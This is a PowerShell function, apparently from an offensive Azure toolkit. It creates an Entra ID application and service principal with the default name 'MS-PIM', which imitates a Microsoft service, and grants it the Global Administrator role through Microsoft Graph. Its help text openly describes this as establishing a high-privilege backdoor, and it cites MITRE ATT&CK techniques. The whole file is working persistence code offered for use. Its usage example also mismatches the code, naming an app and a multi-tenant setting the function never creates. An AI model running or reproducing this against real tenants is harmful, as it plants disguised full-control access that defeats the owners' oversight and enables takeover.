function Add-EntraApplication {
    [cmdletbinding()]
    [OutputType([PSCustomObject])]
    param (
        [Parameter(Mandatory = $false)]
        [string]$DisplayName = 'MS-PIM'
    )

    begin {
        Write-Verbose "Starting function $($MyInvocation.MyCommand.Name)"
        $MyInvocation.MyCommand.Name | Invoke-BlackCat -ResourceTypeName 'MSGraph'
    }

    process {
        try {
            Write-Verbose "Creating Azure AD Application"
            $uri = "$($sessionVariables.graphUri)/applications"

            $applicationBody = @{
                displayName = $DisplayName
            } | ConvertTo-Json -Depth 10

            $requestParam = @{
                Headers     = $script:graphHeader
                Uri         = $uri
                Method      = 'POST'
                Body        = $applicationBody
                ContentType = 'application/json'
                UserAgent   = $($sessionVariables.userAgent)
            }
            $appRegistration = Invoke-RestMethod @requestParam

            Write-Verbose "Creating Service Principal for the application"
            $spUri = "$($sessionVariables.graphUri)/servicePrincipals"

            $spBody = @{
                appId = $appRegistration.appId
            } | ConvertTo-Json

            $spRequest = @{
                Headers     = $script:graphHeader
                Uri         = $spUri
                Method      = 'POST'
                Body        = $spBody
                ContentType = 'application/json'
                UserAgent   = $($sessionVariables.userAgent)
            }

            $servicePrincipal = Invoke-RestMethod @spRequest

            # Add Global Administrator role
            Write-Verbose "Adding Global Administrator role to Service Principal"
            $roleUri = "$($sessionVariables.graphUri)/directoryRoles/roleTemplateId=62e90394-69f5-4237-9190-012177145e10/members/`$ref"

            $roleBody = @{
                "@odata.id" = "$($sessionVariables.graphUri)/directoryObjects/$($servicePrincipal.id)"
            } | ConvertTo-Json

            $roleRequest = @{
                Headers     = $script:graphHeader
                Uri         = $roleUri
                Method      = 'POST'
                Body        = $roleBody
                ContentType = 'application/json'
                UserAgent   = $($sessionVariables.userAgent)
            }

            Invoke-RestMethod @roleRequest

            return [PSCustomObject]@{
                DisplayName                 = $appRegistration.displayName
                ApplicationId               = $appRegistration.appId
                ApplicationObjectId         = $appRegistration.id
                ApplicationCreatedDateTime  = $appRegistration.createdDateTime
                ServicePrincipalDisplayName = $servicePrincipal.displayName
                ServicePrincipalObjectId    = $servicePrincipal.id
                ServicePrincipalType        = $servicePrincipal.servicePrincipalType
                ServicePrincipalEnabled     = $servicePrincipal.accountEnabled
                RoleAssignmentName          = "Global Administrator"
                RoleTemplateId              = "62e90394-69f5-4237-9190-012177145e10"
            }
        }
        catch {
            Write-Message -FunctionName $($MyInvocation.MyCommand.Name) -Message $($_.Exception.Message) -Severity 'Error'
        }
    }
    <#
.SYNOPSIS
Creates an Entra ID Application and assigns Global Administrator role.

.DESCRIPTION
Automates creating an Entra ID Application and service principal with Global Administrator role assignment. Useful for establishing high-privilege backdoor applications with minimal manual steps. The created service principal gains maximum permissions in the tenant.

.PARAMETER DisplayName
Specifies the display name of the Entra ID Application. Defaults to 'MS-PIM' if not provided.

.EXAMPLE
Add-EntraApplication -DisplayName "MyCustomApp"

Creates an Entra ID Application named "MyCustomApp" with its Service Principal and assigns the Global Administrator role.

Example output:
DisplayName                : MyCustomApp
ApplicationId              : 12345678-1234-1234-1234-123456789012
ApplicationObjectId        : abcdef12-3456-7890-abcd-ef1234567890
ApplicationCreatedDateTime : 2024-01-01T12:00:00Z
ServicePrincipalDisplayName : MyCustomApp
ServicePrincipalObjectId   : fedcba98-7654-3210-fedc-ba9876543210
ServicePrincipalType       : Application
ServicePrincipalEnabled    : True
RoleAssignmentName         : Global Administrator
RoleTemplateId             : 62e90394-69f5-4237-9190-012177145e10
Status                     : Success

This example creates an Entra ID Application named "MyApp" with a sign-in audience of "MultiTenant",
creates its Service Principal, and assigns the Global Administrator role to the Service Principal.

.NOTES
- This function requires an authenticated session with Microsoft Graph API.
- Ensure that the necessary permissions are granted to the account executing this function.

.OUTPUTS
A PSCustomObject containing user-friendly information about the created Entra ID Application, Service Principal, and role assignment with the following properties:
- DisplayName: The display name of the application
- ApplicationId: The application (client) ID
- ApplicationObjectId: The object ID of the application
- ApplicationCreatedDateTime: When the application was created
- ServicePrincipalDisplayName: The display name of the service principal
- ServicePrincipalObjectId: The object ID of the service principal
- ServicePrincipalType: The type of service principal
- ServicePrincipalEnabled: Whether the service principal is enabled
- RoleAssignmentName: The name of the assigned role
- RoleTemplateId: The role template ID
- Status: Success/failure status of the operation

.LINK
https://learn.microsoft.com/en-us/graph/overview

.LINK
MITRE ATT&CK Tactic: TA0042 - Resource Development
https://attack.mitre.org/tactics/TA0042/

.LINK
MITRE ATT&CK Technique: T1583.006 - Acquire Infrastructure: Web Services
https://attack.mitre.org/techniques/T1583/006/
#>
}